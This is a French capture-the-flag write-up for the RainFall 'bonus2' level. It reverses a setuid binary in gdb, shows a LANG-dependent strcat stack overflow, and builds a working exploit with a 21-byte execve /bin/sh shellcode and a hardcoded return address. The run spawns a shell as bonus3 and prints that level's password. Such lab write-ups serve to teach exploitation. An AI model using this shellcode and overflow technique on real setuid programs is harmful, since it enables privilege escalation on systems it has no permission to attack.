# BONUS 2

### Reconnaissance

On se connecte au level9 avec le password : 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

Nous trouvons un binaire:
```
bonus2@192.168.56.102's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
bonus2@RainFall:~$ ls
bonus2
bonus2@RainFall:~$ file bonus2 
bonus2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf71cccc3c27dfb47071bb0bc981e2dae92a47844, not stripped
```

On analyse le binaire avec r2.

Si il n'y a pas 2 arguments, il nous envoie a la fin du main. On va donc le lancer avec gdb et 2 arguments :)
```
   0x08048538 <+15>:    cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:    je     0x8048548 <main+31>
   0x0804853e <+21>:    mov    eax,0x1
   0x08048543 <+26>:    jmp    0x8048630 <main+263>
```

Le premier strcpy prend en source le premier argument et une longueur de 40 (0x28)
```
gdb-peda$ r $(python -c 'print "A" * 50') $(python -c 'print "B" * 50')
[...]
   0x804856c <main+67>: mov    DWORD PTR [esp+0x4],eax
   0x8048570 <main+71>: lea    eax,[esp+0x50]
   0x8048574 <main+75>: mov    DWORD PTR [esp],eax
=> 0x8048577 <main+78>: call   0x80483c0 <strncpy@plt>
   0x804857c <main+83>: mov    eax,DWORD PTR [ebp+0xc]
   0x804857f <main+86>: add    eax,0x8
   0x8048582 <main+89>: mov    eax,DWORD PTR [eax]
   0x8048584 <main+91>: mov    DWORD PTR [esp+0x8],0x20
Guessed arguments:
arg[0]: 0xffffd100 --> 0x0 
arg[1]: 0xffffd3fe ('A' <repeats 50 times>)
arg[2]: 0x28 ('(')
```

Le second strcpy prend en source notre 2eme argument et cette fois une longueur de 32 (0x20):
```
   0x8048590 <main+103>:        lea    eax,[esp+0x50]
   0x8048594 <main+107>:        add    eax,0x28
   0x8048597 <main+110>:        mov    DWORD PTR [esp],eax
=> 0x804859a <main+113>:        call   0x80483c0 <strncpy@plt>
   0x804859f <main+118>:        mov    DWORD PTR [esp],0x8048738
   0x80485a6 <main+125>:        call   0x8048380 <getenv@plt>
   0x80485ab <main+130>:        mov    DWORD PTR [esp+0x9c],eax
   0x80485b2 <main+137>:        cmp    DWORD PTR [esp+0x9c],0x0
Guessed arguments:
arg[0]: 0xffffd128 --> 0x0 
arg[1]: 0xffffd431 ('B' <repeats 50 times>)
arg[2]: 0x20 (' ')

```

Un appel a getenv:
```
gdb-peda$ set environment LANG=PWN
[...]
   0x8048597 <main+110>:        mov    DWORD PTR [esp],eax
   0x804859a <main+113>:        call   0x80483c0 <strncpy@plt>
   0x804859f <main+118>:        mov    DWORD PTR [esp],0x8048738
=> 0x80485a6 <main+125>:        call   0x8048380 <getenv@plt>
   0x80485ab <main+130>:        mov    DWORD PTR [esp+0x9c],eax
   0x80485b2 <main+137>:        cmp    DWORD PTR [esp+0x9c],0x0
   0x80485ba <main+145>:        je     0x8048618 <main+239>
   0x80485bc <main+147>:        mov    DWORD PTR [esp+0x8],0x2
Guessed arguments:
arg[0]: 0x8048738 ("LANG")
```

Un memcmp:
```
   0x80485c4 <main+155>:        mov    DWORD PTR [esp+0x4],0x804873d
   0x80485cc <main+163>:        mov    eax,DWORD PTR [esp+0x9c]
   0x80485d3 <main+170>:        mov    DWORD PTR [esp],eax
=> 0x80485d6 <main+173>:        call   0x8048360 <memcmp@plt>
   0x80485db <main+178>:        test   eax,eax
   0x80485dd <main+180>:        jne    0x80485eb <main+194>
   0x80485df <main+182>:        mov    DWORD PTR ds:0x8049988,0x1
   0x80485e9 <main+192>:        jmp    0x8048618 <main+239>
Guessed arguments:
arg[0]: 0xffffd72f --> 0x4e5750 ('PWN')
arg[1]: 0x804873d --> 0x6e006966 ('fi')
arg[2]: 0x2 
```

Et un second:
```
   0x80485f3 <main+202>:        mov    DWORD PTR [esp+0x4],0x8048740
   0x80485fb <main+210>:        mov    eax,DWORD PTR [esp+0x9c]
   0x8048602 <main+217>:        mov    DWORD PTR [esp],eax
=> 0x8048605 <main+220>:        call   0x8048360 <memcmp@plt>
   0x804860a <main+225>:        test   eax,eax
   0x804860c <main+227>:        jne    0x8048618 <main+239>
   0x804860e <main+229>:        mov    DWORD PTR ds:0x8049988,0x2
   0x8048618 <main+239>:        mov    edx,esp
Guessed arguments:
arg[0]: 0xffffd72f --> 0x4e5750 ('PWN')
arg[1]: 0x8048740 --> 0x6c6e ('nl')
arg[2]: 0x2 
```
et enfin l'appel a greetuser.
 
Au final, nous avons pu re ecrire sur une partie de l'EIP:
```
0x08004242 in ?? ()
```

Par contre, si on modifie notre varialble d'environnement par nl:
```
gdb-peda$ set environment LANG=nl
gdb-peda$ r $(python -c 'print "A" * 100') $(python -c 'print "\x04" * 30 + "AA"')
[...]
Stopped reason: SIGSEGV
0x04040404 in ?? ()
```

Parfait!


### Exploitation

Maintenant qu'on sait qu'on peux ecrasé EIP avec notre adresse, on trouve l'offset avec pattern create et on test:
```
gdb-peda$ set environment LANG=nl
gdb-peda$ r $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "CCCC"')
Starting program: /home/yoginet/Documents/101/rainfall/bonus2/bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "CCCC"')
[----------------------------------registers-----------------------------------]
EAX: 0xffffd070 ("Goedemiddag! ")
EBX: 0xffffd110 ('A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC")
ECX: 0x21676164 ('dag!')
EDX: 0x20 (' ')
ESI: 0xffffd15c --> 0xffffd730 --> 0x4c006c6e ('nl')
EDI: 0xffffd10c --> 0x1 
EBP: 0xffffd0b8 --> 0xffffd178 --> 0x0 
ESP: 0xffffd060 --> 0xffffd070 ("Goedemiddag! ")
EIP: 0x8048517 (<greetuser+147>:        call   0x8048370 <strcat@plt>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804850d <greetuser+137>:   mov    DWORD PTR [esp+0x4],eax
   0x8048511 <greetuser+141>:   lea    eax,[ebp-0x48]
   0x8048514 <greetuser+144>:   mov    DWORD PTR [esp],eax
=> 0x8048517 <greetuser+147>:   call   0x8048370 <strcat@plt>
   0x804851c <greetuser+152>:   lea    eax,[ebp-0x48]
   0x804851f <greetuser+155>:   mov    DWORD PTR [esp],eax
   0x8048522 <greetuser+158>:   call   0x8048390 <puts@plt>
   0x8048527 <greetuser+163>:   leave
Guessed arguments:
arg[0]: 0xffffd070 ("Goedemiddag! ")
arg[1]: 0xffffd0c0 ('A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC")
[------------------------------------stack-------------------------------------]
0000| 0xffffd060 --> 0xffffd070 ("Goedemiddag! ")
0004| 0xffffd064 --> 0xffffd0c0 ('A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC")
0008| 0xffffd068 --> 0x3 
0012| 0xffffd06c --> 0x0 
0016| 0xffffd070 ("Goedemiddag! ")
0020| 0xffffd074 ("emiddag! ")
0024| 0xffffd078 ("dag! ")
0028| 0xffffd07c --> 0xf7df0020 (mov    DWORD PTR [esp+0x60],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048517 in greetuser ()
gdb-peda$ context stack 50
--More--(25/50)
--More--(50/50)
[------------------------------------stack-------------------------------------]
0000| 0xffffd060 --> 0xffffd070 ("Goedemiddag! ")
0004| 0xffffd064 --> 0xffffd0c0 ('A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC")
0008| 0xffffd068 --> 0x3 
0012| 0xffffd06c --> 0x0 
0016| 0xffffd070 ("Goedemiddag! ")
0020| 0xffffd074 ("emiddag! ")
0024| 0xffffd078 ("dag! ")
0028| 0xffffd07c --> 0xf7df0020 (mov    DWORD PTR [esp+0x60],eax)
0032| 0xffffd080 --> 0xffffd72d ("NG=nl")
0036| 0xffffd084 --> 0xf7dd4800 --> 0x2b3 
0040| 0xffffd088 --> 0x2 
0044| 0xffffd08c --> 0x7b1ea71 
0048| 0xffffd090 --> 0xf7fe3539 (add    ebx,0x19ac7)
0052| 0xffffd094 --> 0xffffd110 ('A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC")
0056| 0xffffd098 --> 0xf7fae000 --> 0x1e4d6c 
0060| 0xffffd09c --> 0xffffd15c --> 0xffffd730 --> 0x4c006c6e ('nl')
0064| 0xffffd0a0 --> 0xffffd178 --> 0x0 
0068| 0xffffd0a4 --> 0xf7fe9740 (pop    edx)
0072| 0xffffd0a8 --> 0x804873c --> 0x696600 ('')
0076| 0xffffd0ac --> 0xf7f2b630 (mov    eax,DWORD PTR [esp+0x4])
0080| 0xffffd0b0 --> 0xffffd730 --> 0x4c006c6e ('nl')
0084| 0xffffd0b4 --> 0xf7ffd980 --> 0x0 
0088| 0xffffd0b8 --> 0xffffd178 --> 0x0 
0092| 0xffffd0bc --> 0x8048630 (<main+263>:     lea    esp,[ebp-0xc])
0096| 0xffffd0c0 ('A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC")
0100| 0xffffd0c4 ('A' <repeats 36 times>, 'B' <repeats 23 times>, "CCCC")
0104| 0xffffd0c8 ('A' <repeats 32 times>, 'B' <repeats 23 times>, "CCCC")
0108| 0xffffd0cc ('A' <repeats 28 times>, 'B' <repeats 23 times>, "CCCC")
0112| 0xffffd0d0 ('A' <repeats 24 times>, 'B' <repeats 23 times>, "CCCC")
0116| 0xffffd0d4 ('A' <repeats 20 times>, 'B' <repeats 23 times>, "CCCC")
0120| 0xffffd0d8 ('A' <repeats 16 times>, 'B' <repeats 23 times>, "CCCC")
0124| 0xffffd0dc ('A' <repeats 12 times>, 'B' <repeats 23 times>, "CCCC")
0128| 0xffffd0e0 ("AAAAAAAA", 'B' <repeats 23 times>, "CCCC")
0132| 0xffffd0e4 ("AAAA", 'B' <repeats 23 times>, "CCCC")
0136| 0xffffd0e8 ('B' <repeats 23 times>, "CCCC")
0140| 0xffffd0ec ('B' <repeats 19 times>, "CCCC")
0144| 0xffffd0f0 ('B' <repeats 15 times>, "CCCC")
0148| 0xffffd0f4 ('B' <repeats 11 times>, "CCCC")
0152| 0xffffd0f8 ("BBBBBBBCCCC")
0156| 0xffffd0fc ("BBBCCCC")
0160| 0xffffd100 --> 0x434343 ('CCC')
0164| 0xffffd104 --> 0x0 
0168| 0xffffd108 --> 0x0 
0172| 0xffffd10c --> 0x1 
0176| 0xffffd110 ('A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC")
0180| 0xffffd114 ('A' <repeats 36 times>, 'B' <repeats 23 times>, "CCCC")
0184| 0xffffd118 ('A' <repeats 32 times>, 'B' <repeats 23 times>, "CCCC")
0188| 0xffffd11c ('A' <repeats 28 times>, 'B' <repeats 23 times>, "CCCC")
0192| 0xffffd120 ('A' <repeats 24 times>, 'B' <repeats 23 times>, "CCCC")
0196| 0xffffd124 ('A' <repeats 20 times>, 'B' <repeats 23 times>, "CCCC")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ c
Continuing.
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x51 ('Q')
EBX: 0xffffd110 ('A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC")
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xffffd15c --> 0xffffd730 --> 0x4c006c6e ('nl')
EDI: 0xffffd10c --> 0x1 
EBP: 0x42424242 ('BBBB')
ESP: 0xffffd0c0 --> 0x41414100 ('')
EIP: 0x43434343 ('CCCC')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xffffd0c0 --> 0x41414100 ('')
0004| 0xffffd0c4 ('A' <repeats 36 times>, 'B' <repeats 23 times>, "CCCC")
0008| 0xffffd0c8 ('A' <repeats 32 times>, 'B' <repeats 23 times>, "CCCC")
0012| 0xffffd0cc ('A' <repeats 28 times>, 'B' <repeats 23 times>, "CCCC")
0016| 0xffffd0d0 ('A' <repeats 24 times>, 'B' <repeats 23 times>, "CCCC")
0020| 0xffffd0d4 ('A' <repeats 20 times>, 'B' <repeats 23 times>, "CCCC")
0024| 0xffffd0d8 ('A' <repeats 16 times>, 'B' <repeats 23 times>, "CCCC")
0028| 0xffffd0dc ('A' <repeats 12 times>, 'B' <repeats 23 times>, "CCCC")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
```

On voit nos A et nos B sur la stack, on a plus qu'a trouvé la bonne addresse et mettre notre shellcode dans nos arguments.
J'ai choisis l'adresse `0xffffd0e8` donc il faut que j'insère un <a href="http://shell-storm.org/shellcode/files/shellcode-575.php">shellcode d'un longueur max de 23</a>.



```
gdb-peda$ r $(python -c 'print "A" * 60') $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "AA" + "\xe8\xd0\xff\xff"')
Starting program: /home/yoginet/Documents/101/rainfall/bonus2/bonus2 $(python -c 'print "A" * 60') $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "AA" + "\xe8\xd0\xff\xff"')
[----------------------------------registers-----------------------------------]
EAX: 0xffffd070 ("Goedemiddag! ")
EBX: 0xffffd110 ('A' <repeats 40 times>, "j\vX\231Rh//shh/bin\211\343\061\311AA\350\320\377\377")
ECX: 0x21676164 ('dag!')
EDX: 0x20 (' ')
ESI: 0xffffd15c --> 0xffffd730 --> 0x4c006c6e ('nl')
EDI: 0xffffd10c --> 0x1 
EBP: 0xffffd0b8 --> 0xffffd178 --> 0x0 
ESP: 0xffffd060 --> 0xffffd070 ("Goedemiddag! ")
EIP: 0x8048517 (<greetuser+147>:        call   0x8048370 <strcat@plt>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804850d <greetuser+137>:   mov    DWORD PTR [esp+0x4],eax
   0x8048511 <greetuser+141>:   lea    eax,[ebp-0x48]
   0x8048514 <greetuser+144>:   mov    DWORD PTR [esp],eax
=> 0x8048517 <greetuser+147>:   call   0x8048370 <strcat@plt>
   0x804851c <greetuser+152>:   lea    eax,[ebp-0x48]
   0x804851f <greetuser+155>:   mov    DWORD PTR [esp],eax
   0x8048522 <greetuser+158>:   call   0x8048390 <puts@plt>
   0x8048527 <greetuser+163>:   leave
Guessed arguments:
arg[0]: 0xffffd070 ("Goedemiddag! ")
arg[1]: 0xffffd0c0 ('A' <repeats 40 times>, "j\vX\231Rh//shh/bin\211\343\061\311AA\350\320\377\377")
[------------------------------------stack-------------------------------------]
0000| 0xffffd060 --> 0xffffd070 ("Goedemiddag! ")
0004| 0xffffd064 --> 0xffffd0c0 ('A' <repeats 40 times>, "j\vX\231Rh//shh/bin\211\343\061\311AA\350\320\377\377")
0008| 0xffffd068 --> 0x3 
0012| 0xffffd06c --> 0x0 
0016| 0xffffd070 ("Goedemiddag! ")
0020| 0xffffd074 ("emiddag! ")
0024| 0xffffd078 ("dag! ")
0028| 0xffffd07c --> 0xf7df0020 (mov    DWORD PTR [esp+0x60],eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048517 in greetuser ()
gdb-peda$ c
Continuing.
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj
                                                      X�Rh//shh/bin��1�AA����
process 4807 is executing new program: /usr/bin/dash
Warning:
Cannot insert breakpoint 1.
```

Parfait, on a plus qu'a trouvé les adresses sur la vm et faire la meme chose!

On ajoute notre variable d'environnement:
```
bonus2@RainFall:~$ export LANG=nl
```

On vérifie qu'on est le meme offset:
```
bonus2@RainFall:~$ gdb bonus2 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "CCCC"')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "CCCC"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBCCCC

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

On cherche la bonne adresse:
```
(gdb) b*0x08048517
Breakpoint 1 at 0x8048517
(gdb) r $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "CCCC"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "CCCC"')

Breakpoint 1, 0x08048517 in greetuser ()
(gdb) i r
eax            0xbffff5d0       -1073744432
ecx            0x21676164       560423268
edx            0x20     32
ebx            0xbffff670       -1073744272
esp            0xbffff5c0       0xbffff5c0
ebp            0xbffff618       0xbffff618
esi            0xbffff6bc       -1073744196
edi            0xbffff66c       -1073744276
eip            0x8048517        0x8048517 <greetuser+147>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/20s $sp
0xbffff5c0:      "\320\365\377\277 \366\377\277\001"
0xbffff5ca:      ""
0xbffff5cb:      ""
0xbffff5cc:      ""
0xbffff5cd:      ""
0xbffff5ce:      ""
0xbffff5cf:      ""
0xbffff5d0:      "Goedemiddag! "
0xbffff5de:      "\345\267.\377\377\277\370\070\343\267\002"
0xbffff5ea:      ""
0xbffff5eb:      ""
0xbffff5ec:      "\356\070\354\267(\366\377\277p\366\377\277"
0xbffff5f9:      ""
0xbffff5fa:      ""
0xbffff5fb:      ""
0xbffff5fc:      "\274\366\377\277\330\366\377\277\260&\377\267.\377\377\277\200\327\365\267\061\377\377\277\030\371\377\267\330\366\377\277\060\206\004\b", 'A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC"
0xbffff664:      ""
0xbffff665:      ""
0xbffff666:      ""
0xbffff667:      ""
(gdb) x/50s $sp
0xbffff5c0:      "\320\365\377\277 \366\377\277\001"
0xbffff5ca:      ""
0xbffff5cb:      ""
0xbffff5cc:      ""
0xbffff5cd:      ""
0xbffff5ce:      ""
0xbffff5cf:      ""
0xbffff5d0:      "Goedemiddag! "
0xbffff5de:      "\345\267.\377\377\277\370\070\343\267\002"
0xbffff5ea:      ""
0xbffff5eb:      ""
0xbffff5ec:      "\356\070\354\267(\366\377\277p\366\377\277"
0xbffff5f9:      ""
0xbffff5fa:      ""
0xbffff5fb:      ""
0xbffff5fc:      "\274\366\377\277\330\366\377\277\260&\377\267.\377\377\277\200\327\365\267\061\377\377\277\030\371\377\267\330\366\377\277\060\206\004\b", 'A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC"
0xbffff664:      ""
0xbffff665:      ""
0xbffff666:      ""
0xbffff667:      ""
0xbffff668:      ""
0xbffff669:      ""
0xbffff66a:      ""
0xbffff66b:      ""
0xbffff66c:      "s\354\345\267", 'A' <repeats 40 times>, 'B' <repeats 23 times>, "CCCC"
0xbffff6b4:      ""
0xbffff6b5:      ""
0xbffff6b6:      ""
0xbffff6b7:      ""
0xbffff6b8:      ""
0xbffff6b9:      ""
0xbffff6ba:      ""
0xbffff6bb:      ""
0xbffff6bc:      "1\377\377\277\200\322\376\267"
0xbffff6c5:      ""
---Type <return> to continue, or q <return> to quit---
0xbffff6c6:      ""
0xbffff6c7:      ""
0xbffff6c8:      "I\206\004\b\364\017\375\267"
0xbffff6d1:      ""
0xbffff6d2:      ""
0xbffff6d3:      ""
0xbffff6d4:      ""
0xbffff6d5:      ""
0xbffff6d6:      ""
0xbffff6d7:      ""
0xbffff6d8:      ""
0xbffff6d9:      ""
0xbffff6da:      ""
0xbffff6db:      ""
0xbffff6dc:      "\323T\344\267\003"
(gdb) x/s 0xbffff66c + 44
0xbffff698:      'B' <repeats 23 times>, "CCCC"
```

On la converti pour notre payload:
```
>>> p32(0xbffff698)
'\x98\xf6\xff\xbf'
```

Et on lance:
```
bonus2@RainFall:~$ ./bonus2  $(python -c 'print "A" * 60') $(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "AA" + "\x98\xf6\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj
                                                      X�Rh//shh/bin��1�AA����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ whoami
bonus3

```

Enjoy :)
